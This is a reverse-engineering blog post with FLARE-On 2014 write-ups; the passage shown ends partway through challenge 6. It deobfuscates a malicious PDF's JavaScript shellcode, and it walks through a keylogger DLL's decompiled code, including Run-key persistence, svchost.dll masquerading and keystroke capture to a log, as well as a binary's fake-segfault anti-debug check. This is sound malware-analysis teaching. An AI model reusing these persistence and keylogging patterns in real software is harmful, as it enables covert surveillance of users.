---
layout: post
title: "FLARE-On 2014 Solutions Part 2 (Challenges 4, 5, 6 and 7)"
date: 2026-10-18
permalink: /blogs/flare-on-2014-solutions-part-2/
category: Reverse engineering
toc:
  - title: Challenge 4
    id: challenge-4
    children:
      - title: First look with pdfid
        id: first-look-with-pdfid
      - title: Following the chain with pdf-parser
        id: following-the-chain-with-pdf-parser
      - title: Extracting object 6
        id: extracting-object-6
  - title: Challenge 5
    id: challenge-5
    children:
      - title: Analyzing DllMain
        id: analyzing-dllmain
      - title: Listening to the keyboard
        id: listening-to-the-keyboard
      - title: The light-bulb state machine
        id: the-light-bulb-state-machine
      - title: Solving it with a script
        id: solving-it-with-a-script
  - title: Challenge 6
    id: challenge-6
  - title: Challenge 7
    id: challenge-7
    children:
      - title: First look at _main
        id: first-look-at-_main
      - title: The encrypted blob
        id: the-encrypted-blob
      - title: Unpacking without running it
        id: unpacking-without-running-it
      - title: "gratz.exe: the last stage"
        id: gratzexe-the-last-stage
  - title: Wrapping up
    id: wrapping-up
author: Umut Bayram
---

Today, we will solve challenges 4, 5, 6 and 7 of Flare-On 2014. As always, we will not go directly to the flags. If you read the previous post, you know how we work. We go slowly and we ask "why" many times. At the end, the flags will be the easy part.

For the Windows files, we use FLARE VM. For the Linux file, we use REMnux. Let's start.

## Challenge 4

{: #challenge-4}

In this challenge, we have a PDF file: `APT9001.pdf`.

### First look with pdfid

{: #first-look-with-pdfid}

We start with `pdfid`. It reads all the bytes of the file and counts some risky keywords. So in a few seconds, it tells us where to look.

![PDF keyword scan results]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-04-pdfid-output.png' | relative_url }})

For us, three lines are important. `/OpenAction 1(1)` shows that something runs automatically when the file opens. `/JS 1(1)` and `/JavaScript 1(1)` show that the file has JavaScript. Other keywords like `/AA`, `/Launch`, `/EmbeddedFile` and `/AcroForm` are all 0. So the JavaScript in /OpenAction is the best place to start, and we follow it.

<aside class="blog-note" aria-label="Note: The number in parentheses">
  <p class="blog-note__title">Note · The number in parentheses</p>
  <p><code>1(1)</code> means: the keyword is in the file 1 time, and 1 of them is obfuscated with hex escapes. A normal PDF program never writes <code>/J#61vaScript</code> instead of <code>/JavaScript</code>. So if this number is not zero, someone tries to hide something.</p>
</aside>

### Following the chain with pdf-parser

{: #following-the-chain-with-pdf-parser}

pdfid shows us what is in the file. Now we use `pdf-parser` to see the objects and the links between them:

```text
C:\...\C4>pdf-parser APT9001.pdf
...
obj 1 0
 Type: /Catalog
 Referencing: 2 0 R, 3 0 R, 5 0 R
  <<
    /Type /Catalog
    /Outlines 2 0 R
    /Pages 3 0 R
    /OpenAction 5 0 R
  >>
...
obj 5 0
 Type: /Action
 Referencing: 6 0 R
  <<
    /Type /Action
    /S /JavaScript
    /JS 6 0 R
  >>

obj 6 0
 Type:
 Referencing:
 Contains stream
  <<
    /Length 6170
    /Filter '[  \r\n /Fla#74eDe#63o#64#65  /AS#43IIHexD#65cod#65 ]'
  >>
...
```

Let's follow the chain:

```text
obj 1 (Catalog)  → /OpenAction 5 0 R    ; run this when the file opens
obj 5 (Action)   → /S /JavaScript       ; the action is JavaScript
                 → /JS 6 0 R            ; the code is in object 6
obj 6            → Contains stream      ; here is the code
```

You may ask: "Object 6 has no `Type`. How do we know that it is JavaScript?" Because object 5 points to it with `/JS`. In the PDF specification, `/Type` is optional for stream objects like this one. The only information it has is `/Length` and `/Filter`. If we want to check it from the other side, `pdf-parser -r 6 APT9001.pdf` shows which objects point to object 6.

Now look at the filter line. The names are hidden with hex escapes. `#74` is the hex code of `t`, `#63` is `c`, and so on.

So `/Fla#74eDe#63o#64#65` means `/FlateDecode`, and `/AS#43IIHexD#65cod#65` means `/ASCIIHexDecode`.

So the stream has two filters: first Flate (zlib), then ASCIIHex.

But wait. pdfid said that `/OpenAction`, `/JS` and `/JavaScript` are obfuscated too. This is the (1) in its output. So why do we see them clean in object 5? Because by default, pdf-parser decodes the hex escapes in names before it prints them. With `-n` (`--nocanonicalizedoutput`), it prints the names as they are in the file:

```text
pdf-parser -n APT9001.pdf
```

![Raw PDF object names]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-04-pdf-parser-raw-objects.png' | relative_url }})

Now we see the real bytes. In object 5, `/#53` is `/S`, `/#4aav#61#53cr#69pt` is `/JavaScript` and `/#4a#53` is `/JS`. Even `/Type` and `/Page` in object 4 are hidden (`/T#79pe`, `/Pa#67e`). In the normal output, only the filter names stayed hidden, because pdf-parser reads this broken array as a string.

### Extracting object 6

{: #extracting-object-6}

First, we try the normal way. `-f` applies the filters and `-d` writes the result to a file:

```text
pdf-parser APT9001.pdf -o 6 -f -d obj6.js
```

pdf-parser says "ASCIIHexDecode decompress failed". This is actually good news. The Flate step worked, but the tool failed at the second step. Sometimes tools don't work and you should handle it manually, but this time we can also tell pdf-parser to apply only Flate, then we can do the remaining part:

```text
pdf-parser APT9001.pdf -o 6 -f --overridingfilters "/FlateDecode" -d obj6.raw
```

The output is hex text.

![Object six ASCIIHex text]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-04-object-6-hex-text.png' | relative_url }})

Now, we need to convert the hex text to bytes. Let's do it with Python:

```python
data = open("obj6.raw").read()
js = bytes.fromhex(data.replace(">", "").strip()) # The > character is the end marker of ASCIIHexDecode data, so we remove it first.
open("obj6.js", "wb").write(js)
```

![Decoded PDF JavaScript code]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-04-object-6-javascript.png' | relative_url }})

The result is obfuscated JavaScript. The variable names are long and random, and the code is hard to read. While we try to deobfuscate it, we see this line (it is shortened here):

```javascript
var IxTUQnOvHg = unescape(
  "%u72f9%u4649%u1525%u7f0d%u3d3c%ue084 ... %u2454%u5740%ud0ff",
);
```

What is this long string? `unescape()` converts each `%uXXXX` into one 16-bit character. In memory, this is 2 bytes. So the string is really a block of bytes. Let's decode it and see what these bytes are.

We can do the same thing as `unescape()` with Python. First, we copy the string inside IxTUQnOvHg's unescape("...") to a file named payload.txt. Then we will run the below script:

```python
import re

s = open("payload.txt").read()

# Find every "%u" with 4 hex characters after it, and keep only the 4 characters.
# "%u72f9%u4649" -> ["72f9", "4649"]
hexes = re.findall(r"%u([0-9a-fA-F]{4})", s)

# int(h, 16): convert each one to a number.
# to_bytes(2, "little"): convert the number to 2 bytes, low byte first (little-endian).
#   %u72f9  %u4649
#     ↓       ↓
#   f9 72   49 46
# b"".join(...): join all the 2-byte parts.
b = b"".join(int(h, 16).to_bytes(2, "little") for h in hexes)

open("unescaped", "wb").write(b)
```

What is inside `unescaped`? Let's open it in HxD:

![Shellcode header in HxD]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-04-shellcode-hex-start.png' | relative_url }})

The file starts with no known signature. There is no `MZ` or similar sign. So it is not a normal file format. It is only raw bytes.

Most of the bytes look random. But near the end, the "Decoded text" column shows some readable parts, and most of them start with an `h`:

![Shellcode strings in HxD]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-04-shellcode-hex-end.png' | relative_url }})

```text
hary hLibr hLoad   → LoadLibraryA
h32  huser         → user32
hoxA hage  hMess   → MessageBoxA
hD!!! hOWNE        → OWNED!!!
hess hProc hExit   → ExitProcess
```

Why is there an `h` before each part? `68` is the opcode of `push imm32`, and `68` is `h` in ASCII. So each `h` is a `push`, and the 4 characters after it are the pushed value. If we join them in reverse order, we get the strings above.

These are Windows API and DLL names. Normal programs import their functions and do not build their names on the stack like this. Shellcode has no import table, so it often loads DLLs and finds functions by itself, with `LoadLibraryA`. So this file is probably shellcode. It probably loads user32 and shows a message box with the text "OWNED!!!". Let's check this with an emulator.

scdbg is a shellcode emulator. It runs the code in a safe environment. It shows the Windows API calls of the shellcode, and it does not change our system. Let's try it:

![Unsupported opcode in scdbg]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-04-scdbg-unsupported-opcode.png' | relative_url }})

It stopped after only 42 steps. Why? At step 42, scdbg reached the instruction `aad 0x7a` (bytes `D5 7A`, file offset `0x241`). The message "opcode d5 not supported" means that scdbg's emulator does not know the `aad` instruction. So it cannot run it, and the emulation stops there.

A real 32-bit CPU can run `aad` without a problem. Only the emulator has a problem. So how can we continue? We can try to start the emulation at a later point and skip the part with `aad`. Remember the HxD view. The readable parts were near the end, and the beginning looked like random bytes. So maybe the real code does not start at offset 0. Let's find where it starts.

scdbg has a brute-force option for this:

![Shellcode entry point search]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-04-scdbg-entry-search.png' | relative_url }})

scdbg tries every byte of the file as a start point. It runs each one with a step limit and keeps the ones that do not crash. In each line, `offset` is the start point. `steps=MAX` means that the emulation reached the step limit and did not crash, so it is probably real code. `final_eip=7c80ae40` is the address at the end, and it is inside scdbg's fake kernel32. The last column shows the last API call, here `GetProcAddress`.

<aside class="blog-note" aria-label="Note: Why are there junk bytes before the code?">
  <p class="blog-note__title">Note · Why are there junk bytes before the code?</p>
  <p>In a real exploit, the attacker does not know the exact place where execution will start. So he puts many harmless instructions before the real code. This area is called a NOP sled. The CPU can start anywhere in this area, and it &quot;slides&quot; forward to the real code. The classic sled is <code>90 90 90...</code> (<code>nop</code>). But antivirus programs can find it easily. So sled generators use bytes that look random. Each byte is a valid and harmless instruction. Even the operand bytes are valid instructions. In our output, <code>aad 0x7a</code> is <code>D5 7A</code>, and <code>7A</code> alone is also a valid instruction.</p>
</aside>

There is an interesting point here. All of these offsets are _inside the sled_. They show that the sled works. For example, from `0x153`, execution does not reach the `aad` instruction. It slides into the real code and calls `GetProcAddress`. So `-findsc` shows us that real shellcode exists. But it does not show the exact first instruction.

That is OK for now. Let's run one of these start points that work without an error. After the list, scdbg asks which index to execute, and we select `0` (offset `0x153`):

![Shellcode emulation API calls]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-04-scdbg-shellcode-emulation.png' | relative_url }})

Now it works. Execution starts at `0x153`, slides through the junk bytes and reaches the real code. The shellcode finds `LoadLibraryA` with `GetProcAddress`, loads `user32`, finds `MessageBoxA` and shows a message box. The title is `OWNED!!!`, so our guess from HxD was correct. But the message text is garbage. Remember this, because we will come back to it.

We got a lot of information from the emulation and the API calls. Now let's use the garbage text as a clue. The title `OWNED!!!` is clean, but the text is not. So maybe the shellcode builds the text correctly and then changes it before it calls `MessageBoxA`. Let's watch this in a debugger.

In the scdbg output, `MessageBoxA` is called at `0x4013DF`. scdbg loads the file at `0x401000`, so this call is at offset `0x3DF` in the file. We only need to stop there and look around.

Shellcode cannot run alone. So we use **blobrunner** to run it:

```text
blobrunner.exe unescaped
```

We do not need an offset here. A real CPU runs `aad` without a problem, so execution slides through the junk bytes and reaches the real code. Blobrunner allocates memory with `PAGE_EXECUTE_READWRITE`, copies the bytes there, prints the base address and waits for a key. While it waits, no instruction of the shellcode runs. If we press a key now, we see the same message box as in scdbg:

![Blobrunner shellcode message box]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-04-blobrunner-message-box.png' | relative_url }})

Now let's do it again with x32dbg:

1. Run `blobrunner.exe unescaped` and note the base address. Here it is `0x001F0000`.
2. In x32dbg, select File → Attach and choose `blobrunner.exe`. Then press **F9** to continue.
3. Press **Ctrl+G**, go to base + `0x3DF` (`0x001F03DF`) and press **F2** to set a breakpoint. There we see `call eax`, and EAX is `MessageBoxA`.
4. Go back to blobrunner and press a key.

x32dbg stops at `call eax`, but the text on the stack is still garbage. So let's look at the lines above the call:

```asm
001F03C7  mov  esi, ecx
001F03C9  mov  edi, esi
001F03CB  add  edi, 1Eh
001F03CE  cmp  esi, edi
001F03D0  jge  1F03DD
001F03D2  xor  dword ptr ds:[esi], 46454542h
001F03D8  add  esi, 4
001F03DB  jmp  1F03CE
001F03DD  call eax
```

This is a loop, and it XORs the text just before the call. So we restart blobrunner and set the breakpoint before the loop, at `0x001F03CB` (offset `0x3CB`):

![Decoded flag in x32dbg]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-04-x32dbg-decoded-flag.png' | relative_url }})

Look at the registers. EAX is `MessageBoxA`, EBX is `"OWNED!!!"`, and ECX, ESI and EDI includes our flag:

```text
wa1ch.d3m.spl01ts@flare-on.com
```

## Challenge 5

{: #challenge-5}

This time we have a file named as `5get_it`. First, we put the file into DiE to see the general structure.

![Challenge five DLL identification]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-dll-identification.png' | relative_url }})

![DLL data directory entries]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-dll-data-directories.png' | relative_url }})

DiE tells us some things:

- It is a **PE32** file for I386, and it is a **DLL**. So it is 32-bit.
- The linker is Microsoft Linker 10.00.30319 and the compiler is Microsoft Visual C/C++ 16.00.30319. This is **Visual Studio 2010**.
- The language is C++.

Visual Studio 2010 is useful information. Later, in the disassembler, we will see some C runtime functions from this version, and we will not need to analyze them.

Two things are important here. The file is a **32-bit** DLL (PE32), and it has **no exports** (the EXPORT directory is empty). You may ask: "If there is no exported function, how does it run?" It does not need an export. When Windows loads a DLL, it calls `DllMain` automatically. So only loading the DLL is enough to run its code.

In this challenge, we will not run the DLL. We follow the code statically in IDA, and the pseudocode will be enough to solve the challenge.

### Analyzing DllMain

{: #analyzing-dllmain}

When we open the DLL in IDA, we land on the entry point, `DllEntryPoint`:

![DLL entry point in IDA]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-dll-entry-point.png' | relative_url }})

The entry point is only a wrapper. The interesting code starts in `DllMain`, and IDA already found it and named it for us:

![DllMain pseudocode in IDA]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-dllmain.png' | relative_url }})

Let's go part by part.

```c
AllocConsole();
hWnd = FindWindowA("ConsoleWindowClass", nullptr);
ShowWindow(hWnd, 0);   // 0 = SW_HIDE
```

It creates a console window and hides it immediately. So the user does not see anything.

```c
v9 = sub_1000A570();
phModule[0] = nullptr;
if (!GetModuleHandleExA(6u, (LPCSTR)sub_1000A610, phModule)) {
    ...   // prints "GetModuleHandle returned %d"
}
GetModuleFileNameA(phModule[0], Filename, 0x100u);
```

First, it calls `sub_1000A570` and saves the result. We will look at it soon. Then it finds its own path on disk: `GetModuleHandleExA` gets a handle to its own module, and `GetModuleFileNameA` gives the full path.

```c
if (v9 == 2) {
    CopyFileA(Filename, "c:\\windows\\system32\\svchost.dll", 0);
    phModule[2] = (HMODULE)sub_1000A610(
        (BYTE *)"c:\\windows\\system32\\rundll32.exe c:\\windows\\system32\\svchost.dll");
}
return sub_1000A4C0(lpNewFileName);
```

If the check returns `2`, it copies itself into System32 as `svchost.dll`. This name helps it to hide. Then it gives a command line to `sub_1000A610`. At the end, `sub_1000A4C0` runs.

Also notice that there is no check of `fdwReason`. So this code runs at every `DllMain` call, also when threads start and stop in the host process.

#### The "am I installed?" check

Now `sub_1000A570`:

![Registry installation check pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-installation-check.png' | relative_url }})

It opens the machine-wide Run key, `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. The `1u` is `KEY_QUERY_VALUE`, so the key is opened only for reading. Then it tries to read a value named `svchost` into `Data`, an 84-byte buffer. `cbData` is set to 80 (`0x50`) before the call, so this is the size we allow `RegQueryValueExA` to write. The result is saved in `v5`:

| Return | Meaning                                                |
| ------ | ------------------------------------------------------ |
| 0      | The `svchost` value exists, so it is already installed |
| 1      | The Run key could not be opened                        |
| 2      | The value does not exist, so it is not installed yet   |

So this is an "already installed?" check. It stops the DLL from installing itself again and again. It only checks if the value exists, not what is in it.

#### The persistence function

When the check returns `2`, the DLL copies itself into System32 and calls `sub_1000A610` with the `rundll32.exe ... svchost.dll` command. Let's see what this function does with it:

![Registry persistence function pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-registry-persistence.png' | relative_url }})

- `RegCreateKeyA` opens the same Run key that `sub_1000A570` checked. If the key does not exist, it creates it. If this fails, the function returns `1`.
- `RegSetValueExA` writes a value named `svchost`.
- At the end, it returns `0` for success.

So the Run key gets this new value:

| Key                                                  | Value name | Data                                                               |
| ---------------------------------------------------- | ---------- | ------------------------------------------------------------------ |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | `svchost`  | `c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll` |

Windows starts every command in this key at every logon. So the DLL runs again at every logon, and the `svchost` value is exactly what `sub_1000A570` looks for next time.

So flow is like this:

```text
DllMain
  ├─ hide console
  ├─ sub_1000A570()  →  HKLM\...\Run\svchost exists?
  │     └─ no (2) → copy itself to System32\svchost.dll
  │                → sub_1000A610("rundll32.exe ...svchost.dll")   (persistence)
  └─ sub_1000A4C0()   (runs every time)
```

### Listening to the keyboard

{: #listening-to-the-keyboard}

At the end of `DllMain`, `sub_1000A4C0` runs in every case. Let's open it:

![Main keylogger loop pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-keylogger-loop.png' | relative_url }})

IDA marks it as `__noreturn`, and we see why: `while (1)`. This function never ends. Inside the loop, every 10 milliseconds, it calls `sub_10009EB0`. If this function returns something, it gives that value to `sub_10001000`.

Let's look at the inside of `sub_10009EB0`:

![Keyboard handler dispatch pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-key-dispatch.png' | relative_url }})

```c
for (i = 8; ; ++i) {
    if (i > 222) return 0;
    if (GetAsyncKeyState(i) == -32767) break;
}
switch (i) { ... }
```

It checks every key code from 8 to 222. If `GetAsyncKeyState` returns `-32767`, it means the key was just pressed. If no key was pressed, the function returns 0, and the main loop does nothing.

After that, a big `switch` sends each key to its own handler function: `'0'` goes to `sub_10009440`, `'1'` goes to `sub_10009490`, and so on. Each handler returns a character.

#### Where do the keys go?

The last piece is `sub_10001000`:

![Keystroke log writer pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-log-writer.png' | relative_url }})

It opens `svchost.log` in append mode. If it fails, it waits and tries again. Then it writes the character and closes the file. The path is relative, so the file is created in the current directory of the process. Again the `svchost` name, to look like a Windows file.

So now we know the full picture. This DLL is a keylogger:

```text
sub_1000A4C0  (runs forever)
  └─ sub_10009EB0   which key was just pressed?
       └─ handler   returns the character of that key ("0", "a", ...)
            └─ sub_10001000   appends the character to svchost.log
```

The log file is not our goal, though. The flag must be somewhere else. Let's look at the handlers more closely.

### The light-bulb state machine

{: #the-light-bulb-state-machine}

Here is the handler of the `a` key:

![A key handler pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-a-key-handler.png' | relative_url }})

If the handler only returned `"a"`, it would be one line. But it does much more:

```c
if (dword_100194B4 <= 0) {
    if (dword_100194C4 <= 0) {
        if (dword_100194D4 <= 0) {
            _cfltcvt_init();
        } else {
            dword_100194D4 = 0;
            dword_100194D8 = 1;
        }
    } else {
        dword_100194C4 = 0;
        dword_100194C8 = 1;
    }
} else {
    dword_100194B4 = 0;
    dword_100194B8 = 1;
}
return "a";
```

It checks some global `dword` variables. If one of them is set, it clears it and sets another one. If none of them is set, it calls `_cfltcvt_init`. Why does a keylogger need this? Let's look at `_cfltcvt_init`:

![State machine reset pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-state-reset.png' | relative_url }})

It sets `dword_10017000` to `1` and all the others, from `dword_10019460` to `dword_10019500`, to `0`. The name `_cfltcvt_init` comes from IDA's library signatures. It is the name of a C runtime function, so it is easy to skip it. But this is clearly not a C runtime function. It is a **reset**.

<aside class="blog-note" aria-label="Note: Do not trust library names blindly">
  <p class="blog-note__title">Note · Do not trust library names blindly</p>
  <p>IDA's library signatures (FLIRT) match functions by their bytes. A small function can match a library signature by accident. If a &quot;library&quot; function is called from strange places, like a key handler here, open it and check.</p>
</aside>

Now we can understand these variables. Think of them as a row of light bulbs. Only one bulb is on at a time. At the start (and after a reset), the first bulb, `dword_10017000`, is on. Each handler says:

```text
If bulb X is on  → turn it off and turn on bulb Y.
If no bulb fits  → reset (only the first bulb is on again).
```

So the correct key moves the light one step forward, and a wrong key sends it back to the start. One mistake, and we start again from the first letter.

#### Following the light by hand

Let's try to follow the light. It starts at `dword_10017000`. Which handler turns this bulb off? To find it, we click on dword_10017000 in IDA and press X. This opens the cross references (xrefs) window, which lists every place in the code that uses this variable. In the list, we find the handler that turns it off: the `l` key:

![L key handler pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-l-key-handler.png' | relative_url }})

If `dword_10017000` is on, it turns it off and turns on `dword_10019460`. Next, which handler uses `dword_10019460`? It is the `0` key:

![Zero key handler pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-zero-key-handler.png' | relative_url }})

`dword_10019460` → `dword_10019464`. And `dword_10019464`? The `g` key:

![G key handler pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-ida-g-key-handler.png' | relative_url }})

Be careful. A handler can have more than one transition, because the same letter can be in the password more than once. The `g` handler has two transitions for us: `dword_10019464` → `dword_10019468`, and then `dword_10019468` → `dword_1001946C`. So far we have:

| Bulb on    | Key | Next bulb  |
| ---------- | --- | ---------- |
| `10017000` | `l` | `10019460` |
| `10019460` | `0` | `10019464` |
| `10019464` | `g` | `10019468` |
| `10019468` | `g` | `1001946C` |

`l0gg...` Hmm, this starts to look like "logging". We are on the right road.

If we count the lines in `_cfltcvt_init`, there are about 40 bulbs. Following each one by hand means searching for the `= 1` line of every bulb in about 40 handler functions. This is slow, and it is easy to make a mistake. But the pattern is very regular, so this is a job for a script.

### Solving it with a script

{: #solving-it-with-a-script}

I used an LLM to write the below script:

```python
import re
import sys

asm = open(sys.argv[1], encoding="latin-1").read()

# IDA puts the address at the start of every line ("10009AAC   mov ..."), remove it
asm = re.sub(r"^[0-9A-F]{8}[ \t]?", "", asm, flags=re.M)

func_re = re.compile(r"^(\w+)\s+proc\b(.*?)^\1\s+endp", re.M | re.S)
zero_re = re.compile(r"mov\s+(?:ds:)?(dword_[0-9A-F]+),\s*0\b")
one_re = re.compile(r"mov\s+(?:ds:)?(dword_[0-9A-F]+),\s*1\b")
cmp_re = re.compile(r"cmp\s+(?:ds:)?(dword_[0-9A-F]+),\s*0\b")
ret_re = re.compile(r'mov\s+eax,\s*offset\s+\w+\s*;\s*"(.*)"')

transitions = {}   # SRC -> (DST, key)
checks = {}        # bulb -> key of a handler that checks it

for name, body in func_re.findall(asm):
    ret = ret_re.search(body)
    if not ret:
        continue                       # not a key handler
    key = ret.group(1)
    for bulb in cmp_re.findall(body):
        checks[bulb] = key
    src = None
    for line in body.splitlines():
        z = zero_re.search(line)
        o = one_re.search(line)
        if z:
            src = z.group(1)           # bulb turned off
        elif o and src:
            transitions[src] = (o.group(1), key)   # next bulb turned on
            src = None

state = "dword_10017000"              # the first bulb
keys = ""
seen = set()
while state in transitions and state not in seen:
    seen.add(state)
    state, key = transitions[state]
    keys += key

# the last bulb has no transition, but one more key checks it (the "m")
keys += checks.get(state, "")

flag = keys.replace("dot", ".").replace("dash", "-").replace("at", "@")

print("transitions found:", len(transitions))
print("last bulb:", state)
print("keys:", keys)
print("flag:", flag)
```

The script is plain Python. Its input is the disassembly of the DLL as a text file. To create it, in IDA we use **File → Produce file → Create ASM file...** and save it as `5get_it.asm`. Then we run:

```text
python solve_c5.py 5get_it.asm
```

Let's run it:

![Challenge five solver output]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-05-solver-output.png' | relative_url }})

And here is our flag:

```text
l0gging.ur.5tr0ke5@flare-on.com
```

## Challenge 6

{: #challenge-6}

In this challenge, we have a 64-bit ELF file. Its name is `e7bc5d2c0cf4480348f5504196561297`.

Let's look at it in DiE first:

![Challenge six ELF identification]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-elf-identification.png' | relative_url }})

It is a 64-bit ELF for AMD64, little-endian, built with GCC 4.6.3 on Ubuntu. The type is `EXEC`, not `DYN`. So the binary is not PIE, and it will load at the same addresses every time. This makes debugging easier.

DiE also says Go 1.24.1. This cannot be correct, because if we think about that, Go 1.24 came out in 2025 and this challenge is from 2014. DiE uses signatures and heuristics, so sometimes it guesses wrong.

Let's start with the entry point in IDA:

![ELF entry point in IDA]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-ida-entry-point.png' | relative_url }})

This is the `_start` function of glibc. Its only job is to call `__libc_start_main`, and the first argument of this call is `main`. So `main` is `sub_45DCE1`.

How do we know that the first argument is in RDI? In the System V AMD64 calling convention (Linux, 64-bit), the first six arguments go in these registers, in this order, and the other arguments go on the stack:

```text
1st  2nd  3rd  4th  5th  6th  7th and more
RDI  RSI  RDX  RCX  R8   R9   stack
```

Now let's match the registers in `_start`:

```asm
mov   rdi, offset sub_45DCE1   ; 1st argument (RDI): main
pop   rsi                      ; 2nd argument (RSI): argc, the kernel puts it on top of the stack
mov   rdx, rsp                 ; 3rd argument (RDX): argv, after the pop RSP points to the argv array
call  sub_45DD10               ; __libc_start_main(main, argc, argv, ...)
```

So `_start` gives `main`, `argc` and `argv` to `__libc_start_main`. Then `__libc_start_main` calls `main` and passes `argc` and `argv` to it.

We also learn two more things here:

- The addresses are absolute values (`mov reg, offset ...`). A PIE binary uses RIP-relative addresses like `lea rdi, [rip+main]`. So this binary is **not PIE**, and the addresses are the same in IDA and in gdb.
- `__libc_start_main` is inside the binary (`0x45xxxx`). So the binary is **statically linked**. Because of this, libc functions have no names and they look like `sub_` functions.

Now let's look at `main` (`sub_45DCE1`). With the same calling convention, inside `main`, EDI holds `argc` and RSI holds `argv`:

![Main function in IDA]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-ida-main.png' | relative_url }})

`main` is very small. It saves `argc` (EDI) and `argv` (RSI) on the stack, then it calls `sub_452079(argc, argv)` and returns 1. In C:

```c
int main(int argc, char **argv) {
    sub_452079(argc, argv);
    return 1;
}
```

So the real work is inside `sub_452079`. `sub_452079` is very big. It starts at `0x452079` and ends with a `retn` at `0x45DCE0`, just before `main` at `0x45DCE1`. It is also obfuscated, and it has a lot of code like this:

```asm
mov     [rbp+var_5C8], offset aDjango_0 ; "Django"
mov     rax, [rbp+var_5C8]
movzx   eax, byte ptr [rax]
mov     cs:byte_729AB9, al
```

In C:

```c
byte_729AB9 = "Django"[0];   // 'D'
```

It takes the **first character** of a string and writes it to a global byte. It does this many times, with strings like `"Django"`, `"ascii"` and `"imap"`. There are also hundreds of `sub_XXXX(argc, argv)` calls, and they do the same thing. All these bytes go to the area around `0x729900`. So the question is: what does this function build there? Let's remember this question. The binary will answer it later.

Before we go deeper, let's simply run the binary with zero, one and two arguments:

![Initial command line argument tests]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-initial-argument-tests.png' | relative_url }})

We get a different message each time. With no arguments, it prints `no`. With one argument, it prints `na`. With two arguments, it prints `bad`. Let's start with `bad`.

Let's find it in IDA. We open the strings window (**Shift+F12**), search for `bad` and follow its cross-reference. We find this code:

![First argument validation pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-ida-first-argument-check.png' | relative_url }})

`a1` is `argc` and `a2` is `argv`. `a2 + 8` is `argv[1]`, because each pointer is 8 bytes and `argv[0]` is the program name. sub_45EBE0 prints the string, and sub_45E790 is probably exit. So:

1. The length of `argv[1]` must be 10.
2. `sub_468BB0` probably makes a copy of `argv[1]`.
3. Each byte of the copy is XORed with `0x56`.
4. The result is probably compared with ``"bngcg`debd"``.

XOR is its own inverse. So we XOR the expected string with `0x56`:

| Char | Hex  | Hex ^ 0x56 | Result |
| ---- | ---- | ---------- | ------ |
| b    | 0x62 | 0x34       | 4      |
| n    | 0x6E | 0x38       | 8      |
| g    | 0x67 | 0x31       | 1      |
| c    | 0x63 | 0x35       | 5      |
| g    | 0x67 | 0x31       | 1      |
| \`   | 0x60 | 0x36       | 6      |
| d    | 0x64 | 0x32       | 2      |
| e    | 0x65 | 0x33       | 3      |
| b    | 0x62 | 0x34       | 4      |
| d    | 0x64 | 0x32       | 2      |

```python
print("".join(chr(ord(c) ^ 0x56) for c in "bngcg`debd"))
```

The first argument is **`4815162342`**.

Now we know the first argument. Let's run the program with it and any second argument:

![Execution with correct first argument]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-correct-first-argument.png' | relative_url }})

Nothing happens. The program does not print anything, and it does not exit. It only waits. But when we run it in gdb:

![Fake segmentation fault in gdb]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-gdb-fake-segfault.png' | relative_url }})

A segfault? Let's look more carefully. When a program really crashes under gdb, gdb **stops** the program and gives us a prompt. The process is still alive. But here, the next line says that the process **exited** normally. Also, the real gdb message ends with a period, and this message does not have a period. So the program printed this message itself, and then it called `exit()`.

Without gdb, the program only waited. Under gdb, it exits with a fake crash. The only difference is the debugger, so there may be a debugger check here.

Let's check this with the exit code. gdb shows exit codes in octal. So `051` is 41 in decimal. We search for "Segmentation fault" in the IDA strings window (Shift+F12), and we find this code:

![Fake segmentation fault exit code]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-06-ida-fake-segfault.png' | relative_url }})

On Linux, the parent process gets only the lowest 8 bits of the exit code:

```text
0x29 = 41 = 051 (octal)
```

This is the same value that gdb showed. So `sub_45E790` is `exit`. Let's rename it.

<aside class="blog-note" aria-label="Note: Exit codes as a map">
  <p class="blog-note__title">Note · Exit codes as a map</p>
  <p>Each check in this binary uses a different exit code. If we write them down, we always know where we are. We will fill this table step by step:</p>
  <table>
  <thead>
  <tr>
  <th>Message</th>
  <th>exit() argument (hex)</th>
  <th>Code in gdb (octal)</th>
  </tr>
  </thead>
  <tbody>
  <tr>
  <td>&quot;no&quot;</td>
  <td>0x34</td>
  <td><code>064</code></td>
  </tr>
  <tr>
  <td>&quot;na&quot;</td>
  <td>0x1A7</td>
